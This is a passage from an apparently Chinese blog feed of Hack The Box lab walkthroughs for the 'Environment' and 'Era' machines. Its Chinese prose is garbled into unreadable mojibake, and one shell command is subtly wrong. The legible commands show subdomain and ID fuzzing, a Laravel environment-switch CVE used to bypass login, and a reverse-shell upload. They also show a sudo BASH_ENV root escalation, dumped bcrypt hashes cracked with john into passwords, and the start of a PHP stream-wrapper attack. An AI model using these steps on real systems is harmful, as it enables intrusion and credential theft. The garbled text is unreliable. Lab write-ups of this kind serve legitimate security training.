http://environment.htb/ -H <span class="string">&quot;Host: FUZZ.environment.htb&quot;</span></span><br></pre></td></tr></table></figure><p>åŸŸåæ²¡æ‰«å‡ºæ¥ä»€ä¹ˆï¼Œæ‰«å‡ºäº†<code>login</code>ç™»é™†ç•Œé¢ï¼Œè¿˜æœ‰ä¸ª<code>upload</code>çš„ç•Œé¢ã€‚<br><img src="/../images/5a68c2afbc1ef0f15a7d48c9c0a8c87bc59d728da143a842029966757c09e0a8.png" alt="picture 0">  </p><p><img src="/../images/7ed010f60e89aa361b9f94028942b282aeac21b7990feed1110ac68b6df63e40.png" alt="picture 1">  </p><p>æŠ“ä¸€æŠ“<code>login</code>çš„åŒ…çœ‹çœ‹ï¼Œå‘ç°åˆ æ‰<code>remeber</code>åå¯ä»¥çœ‹åˆ°æºä»£ç ã€‚<br>f<img src="/../images/1a710f7231d0d60453aef9583221cc979554a77948ed552bc884536e35caa039.png" alt="picture 2"><br>è¾“å…¥å…¶ä»–å€¼å‘ç°ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹æºä»£ç ã€‚å½“<code>PHP</code>ç¯å¢ƒä¸º<code>preprod</code>çš„æ—¶å€™ï¼Œå°±ä¼šä»¥<code>id=1</code>çš„ç”¨æˆ·ç™»å½•ã€‚<br><img src="/../images/000f70788f29d9cde067b2bed9af0b0bbb6c8445e64233eb52045a03f3d024e8.png" alt="picture 3">  </p><p>å»æ‰¾ä¸‹<code>Laravel 11.30.0</code>æœ‰æ²¡æœ‰<code>CVE</code>èƒ½å¤Ÿä¿®æ”¹ç¯å¢ƒçš„ã€‚<a href="https://github.com/Nyamort/CVE-2024-52301">CVE-2024-52301</a>ã€‚</p><p>ç›´æ¥è¯·æ±‚ã€‚<br><img src="/../images/e5f6e10d6f959c71684d3a418f0f3297b7675ab20ae739d176af750f535e06a8.png" alt="picture 4">  </p><p>ç™»å½•æˆåŠŸåå¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä¸Šä¼ ä¸ª<code>php</code>è¯•è¯•ã€‚<br><img src="/../images/90a2d78a7042b4ba6a925703b452ac0e14a56e47d0a0db4282b2a9704fffe818.png" alt="picture 5">  </p><p>ç›´æ¥ä¸Šä¼ ä¸ªåå¼¹<code>shell</code>çš„<code>php</code>ï¼Œä¹‹åè®¿é—®è¯¥<code>php</code>ï¼ŒæˆåŠŸåå¼¹<code>shell</code>ã€‚<br><img src="/../images/ab5bf69523ed887110a97ed27296f9ef16cc99e64d6c423b0087bcda05d3b183.png" alt="picture 6">  </p><p><img src="/../images/3842d4343a0a1a3f6da08fad54548a1135be80af4d8bb47efdf038897f087be6.png" alt="picture 7">  </p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># äº¤äº’å¼ç»ˆç«¯</span></span><br><span class="line">python3 -m <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash/&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>åˆ°å¤„çœ‹ä¸€çœ‹ï¼Œå‘ç°å¯¹hishçš„ç›®å½•æœ‰è®¿é—®çš„æƒé™ã€‚å¯ä»¥å…ˆè·å–<code>user.txt</code><br><img src="/../images/ad3b3ad009ed36ecc83ba412ffa95fba2aaf274b948cdd32bdc165cb14fff1a1.png" alt="picture 8">  </p><p>è¿›å…¥åˆ°<code>backup</code>ï¼Œå‘ç°ä¸€ä¸ª<code>keyvault.gpg</code>æ–‡ä»¶ï¼Œå¯èƒ½æ˜¯åŠ å¯†è¿‡çš„æ–‡ä»¶ã€‚<br>è¿›å…¥<code>.gnupg</code>ï¼Œç›®å½•ä¸¢ç»™<code>gpt</code>ï¼Œå›ç­”å¯èƒ½æ˜¯ç§é’¥ä¿¡æ¯ã€‚</p><p><img src="/../images/e4fa775c8f1d8756d6d9e1de9d62737ac709bec26c7cea31b544aa2462222758.png" alt="picture 9"></p><p>é‚£å°±éªŒè¯ä¸€ä¸‹ï¼Œå‘ç°æŸ¥çœ‹ç§é’¥çš„æ—¶å€™æ²¡æœ‰æƒé™ï¼Œé‚£å°±å¤åˆ¶åˆ°åˆ«çš„åœ°æ–¹ã€‚<br><img src="/../images/4d6bb159442f446d8c32ff2d06dfc365c4a454cb16c08745a325af2f5e3b671a.png" alt="picture 10"> </p><p>ä¹‹åè§£å¯†ä¸€ä¸‹çœ‹çœ‹ã€‚<br><img src="/../images/144aa5f2a57f8205b5bd4fea313b074cb536f79650e3d92b67ff546b745acc73.png" alt="picture 11">  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sshç™»å½•ä¸€ä¸‹</span></span><br><span class="line">ssh hish@10.10.11.67 </span><br><span class="line"></span><br><span class="line"><span class="comment"># ç™»å½•æˆåŠŸåçœ‹çœ‹ä»€ä¹ˆå¯ä»¥ä»¥rootèº«ä»½æ‰§è¡Œ</span></span><br><span class="line">hish@environment:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> hish: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> hish on environment:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=<span class="string">&quot;ENV</span></span><br><span class="line"><span class="string">    BASH_ENV&quot;</span>, use_pty</span><br><span class="line"></span><br><span class="line">User hish may run the following commands on environment:</span><br><span class="line">    (ALL) /usr/bin/systeminfo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘ç°æœ‰ä¸ªsysteminfo å¯ä»¥ï¼ŒæŸ¥çœ‹ä¸‹å†…å®¹</span></span><br><span class="line"><span class="built_in">cat</span> /usr/bin/systeminfo</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n### Displaying kernel ring buffer logs (dmesg) ###&quot;</span></span><br><span class="line">dmesg | <span class="built_in">tail</span> -n 10</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n### Checking system-wide open ports ###&quot;</span></span><br><span class="line">ss -antlp</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n### Displaying information about all mounted filesystems ###&quot;</span></span><br><span class="line">mount | column -t</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n### Checking system resource limits ###&quot;</span></span><br><span class="line"><span class="built_in">ulimit</span> -a</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n### Displaying loaded kernel modules ###&quot;</span></span><br><span class="line">lsmod | <span class="built_in">head</span> -n 10</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n### Checking disk usage for all filesystems ###&quot;</span></span><br><span class="line"><span class="built_in">df</span> -h</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‚£å°±ç”Ÿæˆåå¼¹shellçš„åŒåæ–‡ä»¶ï¼Œå‘ç°æ²¡åŠæ³•æ‰§è¡ŒæˆåŠŸï¼Œé‚£å°±æŠŠsudo -lçš„å†…å®¹ç»™gpté—®é—®ï¼Œæœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -p&#x27;</span> &gt; exp.sh</span><br><span class="line"><span class="built_in">chmod</span> +x exp.sh</span><br><span class="line">sudo BASH_ENV=./exp.sh /usr/bin/systeminfo</span><br><span class="line"><span class="comment"># è·å–åˆ°rootæƒé™</span></span><br><span class="line">root@environment:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><h2 id="åˆå­¦åˆ°äº†T-T"><a href="#åˆå­¦åˆ°äº†T-T" class="headerlink" title="åˆå­¦åˆ°äº†T_T"></a>åˆå­¦åˆ°äº†T_T</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Environment&quot;&gt;&lt;a href=&quot;#Environment&quot; class=&quot;headerlink&quot; title=&quot;Environment&quot;&gt;&lt;/a&gt;Environment&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Pwned-Exploiting HTB Era</title>
    <link href="https://2in9ya2.github.io/Pwned-Exploiting-HTB-Era/"/>
    <id>https://2in9ya2.github.io/Pwned-Exploiting-HTB-Era/</id>
    <published>2025-08-25T07:52:22.812Z</published>
    <updated>2025-08-25T07:52:22.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Era"><a href="#Era" class="headerlink" title="Era"></a>Era</h1><span id="more"></span><h2 id="ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ"><a href="#ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ" class="headerlink" title="ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ"></a>ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -Pn --min-rate 2000 10.10.11.79 --verbose</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰<code>21ï¼Œ80</code>ç«¯å£ã€‚é‚£å°±è®¿é—®ä¸€ä¸‹<code>80</code>ç«¯å£ï¼Œå‘ç°æ— æ³•è®¿é—®ï¼Œé‚£å°±æ·»åŠ åˆ°<code>/etc/hosts</code>é‡Œé¢ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;10.10.11.79\tera.htb&#x27;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure><p>æ‰¾ä¸€æ‰¾ï¼ŒæŠ“æŠ“åŒ…ï¼Œå‘ç°æ²¡ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼Œé‚£å°±æ‰«ä¸‹å…¶ä»–æ–‡ä»¶å’Œå­åŸŸåã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰«æ–‡ä»¶</span></span><br><span class="line">python dirsearch.py -u http://era.htb/</span><br><span class="line"><span class="comment"># æ‰«åŸŸå</span></span><br><span class="line">ffuf -w fuzzDicts/subdomainDicts/main.txt -u http://era.htb/ -H <span class="string">&quot;Host: FUZZ.era.htb&quot;</span></span><br></pre></td></tr></table></figure><p>å‘ç°äº†ä¸€ä¸ª<code>file</code>çš„å­åŸŸåã€‚æ— æ³•è®¿é—®ï¼Œæ·»åŠ åˆ°<code>/etc/hosts</code>ä¸­ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;10.10.11.79\tfile.era.htb&#x27;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line"><span class="comment"># æ‰«ä¸€æ‰«ï¼Œä¸ºä»€ä¹ˆ-fw 4 å› ä¸ºä¸åŠ çš„è¯ï¼Œä¼šå‡ºç°å¾ˆå¤šï¼Œé‚£å°±åˆ¤æ–­Words: 4æ— æ•ˆ</span></span><br><span class="line">ffuf -w ../fuzzDicts/subdomainDicts/main.txt -u http://era.htb/ -H <span class="string">&quot;Host: FUZZ.era.htb&quot;</span> -fw 4</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯éœ€è¦ç™»å½•ï¼Œé‚£å°±æ‰«æ‰«<code>file.era.htb</code>çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–çš„æ–‡ä»¶ã€‚<br><img src="/../images/338225ffec47916d8d6276c019409dd590d39e5300bcad134e335f0676684516.png" alt="picture 0">  </p><p><img src="/../images/5cf3a72c729c73eff51086967d2269ba250a28c56d6aace585f6de2b6c0843ce.png" alt="picture 1">  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰«æ‰«æ–‡ä»¶</span></span><br><span class="line">python dirsearch.py -u http://file.era.htb/</span><br></pre></td></tr></table></figure><p>æœ‰ä¸ª<code>register.php</code>ï¼Œè¿›å»çœ‹çœ‹æ˜¯ä¸æ˜¯èƒ½æ³¨å†Œã€‚<br><img src="/../images/a6e295bb9e04b20de6b191cb3db9cb2f3a881ac3814103bf51fe648b8e363512.png" alt="picture 2"><br>æ³¨å†Œä¹‹åï¼Œå¯ä»¥ç™»å½•ã€‚å¹¶ä¸”å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œé‚£å°±ä¸Šä¼ ä¸€ä¸ªè„šæœ¬çœ‹çœ‹ã€‚<br><img src="/../images/9358b76b9a89c1e7fced03b9341672cede78f44edc97d161f165e6a50b2617bc.png" alt="picture 3"><br>å‘ç°æœ‰ç¼–å·ã€‚<br><img src="/../images/c769440e2a559ff2031b079bcf282a61d274b793567f994e568a7f98318d1c0a.png" alt="picture 4"><br><img src="/../images/2653674a307fa876e068853703fa29d72e6cedfdab4363139ec241c40749fefb.png" alt="picture 5"><br>é‚£å…¶å®å¯ä»¥çœ‹çœ‹éƒ½æœ‰ä»€ä¹ˆæ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">seq</span> 4000 &gt; num.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯•äº†ä¸‹ï¼Œå…¨æ˜¯302ï¼Œæ˜¯ä¸æ˜¯æœ‰cookie</span></span><br><span class="line">ffuf -u <span class="string">&#x27;http://file.era.htb/download.php?id=FUZZ&#x27;</span> -w ../../Downloads/num.txt </span><br><span class="line"></span><br><span class="line"><span class="comment"># å†è¯•ä¸‹ï¼Œè¿‡æ»¤æ‰æ²¡æœ‰çš„3161ï¼Œå†è¯•è¯•</span></span><br><span class="line">ffuf -u <span class="string">&#x27;http://file.era.htb/download.php?id=FUZZ&#x27;</span> -w ../../Downloads/num.txt -H <span class="string">&quot;Cookie:PHPSESSID=iv03adftavqoviaa3q3aj9ffvn&quot;</span></span><br><span class="line"></span><br><span class="line">ffuf -u <span class="string">&#x27;http://file.era.htb/download.php?id=FUZZ&#x27;</span> -w ../../Downloads/num.txt -H <span class="string">&quot;Cookie:PHPSESSID=iv03adftavqoviaa3q3aj9ffvn&quot;</span> -fw 3161</span><br></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªæ–‡ä»¶è¢«æœåˆ°ï¼Œä¸‹è½½åˆ°æœ¬åœ°çœ‹ä¸€çœ‹ã€‚<br><img src="/../images/6a992a120c00f6b3aa5aa8c4b734bd43303f9cd471ca7c55d2150b7a7497b4b0.png" alt="picture 6">  </p><p><img src="/../images/9a453a473cbd0dda50772285dab0628c6c55ba8c4faa1fc4b9c9d60f18f6d2b4.png" alt="picture 7">  </p><p>åœ¨<code>site-backup</code>é‡Œé¢æœ‰ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œçœ‹ä¸€çœ‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">sqlite3 filedb.sqlite </span><br><span class="line"><span class="comment"># çœ‹çœ‹è¡¨</span></span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">files  <span class="built_in">users</span></span><br><span class="line"><span class="comment"># çœ‹çœ‹å­—æ®µï¼Œå‘ç°æœ‰å¯†ç </span></span><br><span class="line">.schema <span class="built_in">users</span></span><br><span class="line">CREATE TABLE <span class="built_in">users</span> (</span><br><span class="line">user_id INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">user_name varchar(255) NOT NULL,</span><br><span class="line">user_password varchar(255) NOT NULL,</span><br><span class="line">auto_delete_files_after int NOT NULL</span><br><span class="line">, security_answer1 varchar(255), security_answer2 varchar(255), security_answer3 varchar(255));</span><br><span class="line"><span class="comment"># çœ‹çœ‹å†…å®¹</span></span><br><span class="line">SELECT * FROM <span class="built_in">users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é‚£å°±è§£ä¸€ä¸‹å¯†ç </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;admin_ef01cab31aa:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC</span></span><br><span class="line"><span class="string">eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm</span></span><br><span class="line"><span class="string">veronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK</span></span><br><span class="line"><span class="string">yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.</span></span><br><span class="line"><span class="string">john:$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6</span></span><br><span class="line"><span class="string">ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC&#x27;</span> &gt; hashes.txt</span><br><span class="line"></span><br><span class="line">john --wordlist=../tools/rockyou.txt hashes.txt </span><br><span class="line">john --show hashes.txt</span><br><span class="line"><span class="comment"># è§£å‡ºæ¥ä¸¤ä¸ª</span></span><br><span class="line">eric:america</span><br><span class="line">yuri:mustang</span><br></pre></td></tr></table></figure><p>æœ‰è¿™ä¸¤ä¸ªè´¦æˆ·ç™»å½•çœ‹çœ‹ï¼Œå‘ç°ä¹Ÿæ²¡ä»€ä¹ˆæœ‰ç”¨çš„ï¼Œçœ‹çœ‹æ–‡ä»¶å¤¹é‡Œå…¶ä»–çš„<code>php</code>ã€‚<br><code>security_login.php</code>ï¼Œç½‘é¡µç™»å½•çœ‹çœ‹ã€‚ä¹‹å‰å‘ç°äº†adminè´¦æˆ·çš„ä¸€äº›è®¤è¯é—®é¢˜ï¼Œç™»å½•çœ‹çœ‹ã€‚å‘ç°ä¹Ÿæ²¡ä»€ä¹ˆï¼Œä¹‹å‰æœ‰ä¸ª<code>21</code>ç«¯å£å¼€ç€ï¼Œçœ‹çœ‹ftpèƒ½ä¸èƒ½ç™»å½•ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å‘ç°yuriå¯ä»¥ç™»å½•</span></span><br><span class="line">ftp 10.10.11.79 </span><br><span class="line">Name (10.10.11.79): yuri</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf</span><br><span class="line">drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf</span><br><span class="line">226 Directory send OK.</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿›å»çœ‹ä¸€çœ‹ ä¸‹è½½åˆ°æœ¬åœ°çœ‹ä¸€çœ‹ å¥½åƒä¹Ÿæ²¡ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„</span></span><br><span class="line">ftp&gt; <span class="built_in">cd</span> apache2_conf</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0            1332 Dec 08  2024 000-default.conf</span><br><span class="line">-rw-r--r--    1 0        0            7224 Dec 08  2024 apache2.conf</span><br><span class="line">-rw-r--r--    1 0        0             222 Dec 13  2024 file.conf</span><br><span class="line">-rw-r--r--    1 0        0             320 Dec 08  2024 ports.conf</span><br><span class="line"><span class="comment"># è¿›å…¥php8.1_confçœ‹ä¸€çœ‹</span></span><br><span class="line"></span><br><span class="line">ftp&gt; <span class="built_in">cd</span> php8.1_conf</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span> -al</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    3 0        0            4096 Jul 22 08:42 .</span><br><span class="line">drwxr-xr-x    4 0        114          4096 Jul 22 08:42 ..</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Jul 22 08:42 build</span><br><span class="line">-rw-r--r--    1 0        0           35080 Dec 08  2024 calendar.so</span><br><span class="line">-rw-r--r--    1 0        0           14600 Dec 08  2024 ctype.so</span><br><span class="line">-rw-r--r--    1 0        0          190728 Dec 08  2024 dom.so</span><br><span class="line">-rw-r--r--    1 0        0           96520 Dec 08  2024 exif.so</span><br><span class="line">-rw-r--r--    1 0        0          174344 Dec 08  2024 ffi.so</span><br><span class="line">-rw-r--r--    1 0        0         7153984 Dec 08  2024 fileinfo.so</span><br><span class="line">-rw-r--r--    1 0        0           67848 Dec 08  2024 ftp.so</span><br><span class="line">-rw-r--r--    1 0        0           18696 Dec 08  2024 gettext.so</span><br><span class="line">-rw-r--r--    1 0        0           51464 Dec 08  2024 iconv.so</span><br><span class="line">-rw-r--r--    1 0        0         1006632 Dec 08  2024 opcache.so</span><br><span class="line">-rw-r--r--    1 0        0          121096 Dec 08  2024 pdo.so</span><br><span class="line">-rw-r--r--    1 0        0           39176 Dec 08  2024 pdo_sqlite.so</span><br><span class="line">-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so</span><br><span class="line">-rw-r--r--    1 0        0           43272 Dec 08  2024 posix.so</span><br><span class="line">-rw-r--r--    1 0        0           39176 Dec 08  2024 readline.so</span><br><span class="line">-rw-r--r--    1 0        0           18696 Dec 08  2024 shmop.so</span><br><span class="line">-rw-r--r--    1 0        0           59656 Dec 08  2024 simplexml.so</span><br><span class="line">-rw-r--r--    1 0        0          104712 Dec 08  2024 sockets.so</span><br><span class="line">-rw-r--r--    1 0        0           67848 Dec 08  2024 sqlite3.so</span><br><span class="line">-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so</span><br><span class="line">-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvmsg.so</span><br><span class="line">-rw-r--r--    1 0        0           14600 Dec 08  2024 sysvsem.so</span><br><span class="line">-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvshm.so</span><br><span class="line">-rw-r--r--    1 0        0           35080 Dec 08  2024 tokenizer.so</span><br><span class="line">-rw-r--r--    1 0        0           59656 Dec 08  2024 xml.so</span><br><span class="line">-rw-r--r--    1 0        0           43272 Dec 08  2024 xmlreader.so</span><br><span class="line">-rw-r--r--    1 0        0           51464 Dec 08  2024 xmlwriter.so</span><br><span class="line">-rw-r--r--    1 0        0           39176 Dec 08  2024 xsl.so</span><br><span class="line">-rw-r--r--    1 0        0           84232 Dec 08  2024 zip.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡Œé¢å¥½å¤šsoæ–‡ä»¶ï¼Œé—®é—®gptï¼Œgptè¯´ssh2.so æä¾›äº† PHP ä½¿ç”¨ SSH åè®®çš„èƒ½åŠ›ï¼Œç›¸å½“äºåœ¨ PHP é‡ŒåµŒå…¥äº†ä¸€ä¸ªè¿·ä½ ç‰ˆçš„ SSH/SFTP å®¢æˆ·ç«¯ã€‚</span></span><br><span class="line"><span class="comment"># åœ¨ PHP è„šæœ¬é‡Œï¼Œå¦‚æœ ssh2 æ‰©å±•å·²å¯ç”¨ï¼Œå¯ä»¥è°ƒç”¨ä¸€äº›å‡½æ•°ï¼Œä¾‹å¦‚ï¼š</span></span><br><span class="line"><span class="comment"># ssh2_connect() â†’ å»ºç«‹ SSH è¿æ¥</span></span><br><span class="line"><span class="comment"># ssh2_auth_password() â†’ ä½¿ç”¨ç”¨æˆ·å/å¯†ç è®¤è¯</span></span><br><span class="line"><span class="comment"># ssh2_exec() â†’ åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"><span class="comment"># ssh2_scp_send() / ssh2_scp_recv() â†’ é€šè¿‡ SCP ä¸Šä¼ /ä¸‹è½½æ–‡ä»¶</span></span><br><span class="line"><span class="comment"># ssh2_sftp() â†’ æ‰“å¼€ä¸€ä¸ª SFTP ä¼šè¯</span></span><br><span class="line"><span class="comment"># çœ‹çœ‹æ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨ï¼Œè¿”å›å»çœ‹çœ‹phpæ–‡ä»¶ï¼Œæœ‰ä¸ªdownload.phpï¼Œä¸¢åˆ°gpté‡Œé¢</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç®¡ç†å‘˜æ¨¡å¼ä¸‹ï¼ˆshow=true ä¸” erauser=1ï¼‰ï¼Œæ‹¼æ¥äº† $wrapper . $fileï¼Œè€Œä¸” $wrapper å¯ä»¥æ˜¯ä»»æ„åè®®ï¼ˆåªè¦ format é‡ŒåŒ…å« ://ï¼‰ã€‚</span></span><br><span class="line"><span class="comment"># PHP å†…ç½®äº†å¾ˆå¤š stream wrapperï¼Œæ¯”å¦‚ï¼š</span></span><br><span class="line"><span class="comment"># php://filter â†’ å¯ä»¥å¯¹æ–‡ä»¶åš base64 ç¼–ç è¯»å–</span></span><br><span class="line"><span class="comment"># ftp:// â†’ å¯ä»¥è®¿é—® FTP æ–‡ä»¶</span></span><br><span class="line"><span class="comment"># ssh2:// â†’ å¦‚æœæ‰©å±•å¯ç”¨ï¼Œå¯ä»¥èµ° SSH</span></span><br><span class="line"><span class="comment"># http:// â†’ 